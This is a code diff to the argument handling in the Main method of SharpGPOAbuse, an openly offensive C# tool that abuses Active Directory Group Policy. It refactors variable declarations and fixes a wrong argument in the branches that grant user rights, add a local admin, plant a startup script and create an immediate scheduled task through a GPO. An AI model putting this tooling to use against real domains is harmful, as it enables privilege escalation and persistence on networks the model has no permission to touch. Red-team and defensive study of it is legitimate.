@@ -7,6 +7,15 @@ namespace SharpGPOAbuse
     static void Main(string[] args)
     {
 
+      string GPOName;
+      string ScriptName;
+      string ScriptContent;
+      string UserAccount;
+      string[] UserRights;
+      string Author;
+      string TaskName;
+      string Command;
+      string Arguments;
       try {
         Domain currentDomain = Domain.GetCurrentDomain();
         string DomainController = currentDomain.PdcRoleOwner.Name.ToLower();
@@ -14,6 +23,7 @@ namespace SharpGPOAbuse
 
         string[] DCs;
         string DistinguishedName = "CN=Policies,CN=System";
+
 
         DCs = DomainName.Split('.');
 
@@ -26,9 +36,9 @@ namespace SharpGPOAbuse
           if (AttackName.ToLower() == "addnewrights") {
             if (args.Length == 4) {
               PrintInfo();
-              string GPOName = args[1];
-              string UserAccount = args[2];
-              string[] UserRights = args[3].Split(',');
+              GPOName = args[1];
+              UserAccount = args[2];
+              UserRights = args[3].Split(',');
               UserRightAssignment.AddNewRights(DomainName, DomainController, GPOName, DistinguishedName, UserRights, UserAccount);
             } else {
               Console.WriteLine("Invalid Argument Length for Attack Type!");
@@ -39,8 +49,8 @@ namespace SharpGPOAbuse
             if (args.Length == 3) {
               PrintInfo();
 
-              string GPOName = args[1];
-              string UserAccount = args[2];
+              GPOName = args[1];
+              UserAccount = args[2];
               LocalAdmin.NewLocalAdmin(UserAccount, DomainName, DomainController, GPOName, DistinguishedName, false);
             } else {
               Console.WriteLine("Invalid Argument Length for Attack Type!");
@@ -50,9 +60,9 @@ namespace SharpGPOAbuse
           } else if (AttackName.ToLower() == "newstartupscript") {
             if (args.Length == 4) {
               PrintInfo();
-              string GPOName = args[1];
-              string UserAccount = args[2];
-              string ScriptContent = args[3];
+              GPOName = args[1];
+              ScriptName = args[2];
+              ScriptContent = args[3];
               StartupScript.NewStartupScript(ScriptName, ScriptContent, DomainName, DomainController, GPOName, DistinguishedName, "User");
             } else {
               Console.WriteLine("Invalid Argument Length for Attack Type!");
@@ -62,11 +72,11 @@ namespace SharpGPOAbuse
           } else if (AttackName.ToLower() == "newimmediatetask") {
             if (args.Length == 6) {
               PrintInfo();
-              string GPOName = args[1];
-              string Author = args[2];
-              string TaskName = args[3];
-              string Command = args[4];
-              string Arguments = args[5];
+              GPOName = args[1];
+              Author = args[2];
+              TaskName = args[3];
+              Command = args[4];
+              Arguments = args[5];
               ScheduledTask.NewImmediateTask(DomainName, DomainController, GPOName, DistinguishedName, TaskName, Author, Arguments, Command, false, "Computer");
             } else {
               Console.WriteLine("Invalid Argument Length for Attack Type!");
